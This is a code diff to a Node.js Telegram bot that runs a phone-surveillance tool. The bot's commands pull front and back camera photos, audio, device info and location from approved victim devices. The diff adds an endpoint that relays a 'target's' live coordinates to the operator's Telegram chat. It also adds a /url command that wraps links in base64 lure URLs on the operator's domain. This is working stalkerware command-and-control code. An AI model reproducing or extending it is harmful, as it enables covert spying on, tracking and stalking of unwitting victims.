@@ -30,6 +30,7 @@ global.pendingUsername = "Unknown";
 bot.setMyCommands([
     { command: 'start', description: 'Start bot & check status' },
     { command: 'approve', description: 'Authorize pending device' },
+    { command: 'url', description: 'Generate Base64 Stream Link (/url <link>)' },
     { command: 'moref', description: 'Front Camera 5 Photos' },
     { command: 'moreb', description: 'Back Camera 5 Photos' },
     { command: 'moreff', description: 'Front Camera with Screen Flash' },
@@ -53,6 +54,21 @@ require('./modules/location')(app);
 require('./modules/info')(app);
 require('./modules/audio')(app);
 
+// ==========================================
+// NAYA: Location Receive karne ka Route
+// ==========================================
+app.post('/upload-location', (req, res) => {
+    const { lat, lon } = req.body;
+    if (lat && lon) {
+        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        console.log(`📍 Location Received: ${mapLink}`);
+        bot.sendMessage(adminId, `📍 **Target Live Location:**\n${mapLink}`).catch(err => {});
+        res.status(200).send({ success: true });
+    } else {
+        res.status(400).send({ success: false });
+    }
+});
+
 io.on('connection', (socket) => {
     console.log('Client connected:', socket.id);
 
@@ -74,7 +90,7 @@ io.on('connection', (socket) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
+        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /url <link>\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
     }
 });
 
@@ -88,6 +104,26 @@ bot.onText(/\/approve/, (msg) => {
             global.pendingSocketId = null;
         } else {
             bot.sendMessage(chatId, "❌ No pending device request.");
+        }
+    }
+});
+
+// ==========================================
+// NAYA: Telegram /url Command Handler
+// ==========================================
+bot.onText(/\/url (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() === adminId.toString()) {
+        const streamLink = match[1];
+        try {
+            const base64Encoded = Buffer.from(streamLink).toString('base64');
+            // Apni website ka domain yahan replace kar lena (jaise Render ya Vercel link)
+            const myDomain = "https://your-app-name.onrender.com"; 
+            const finalLink = `${myDomain}/?v=${base64Encoded}`;
+
+            bot.sendMessage(chatId, `✅ **Stream Link Generated:**\n\n\`${finalLink}\``, { parse_mode: 'Markdown' });
+        } catch (error) {
+            bot.sendMessage(chatId, `❌ Error: Link generate nahi ho paya.`);
         }
     }
 });
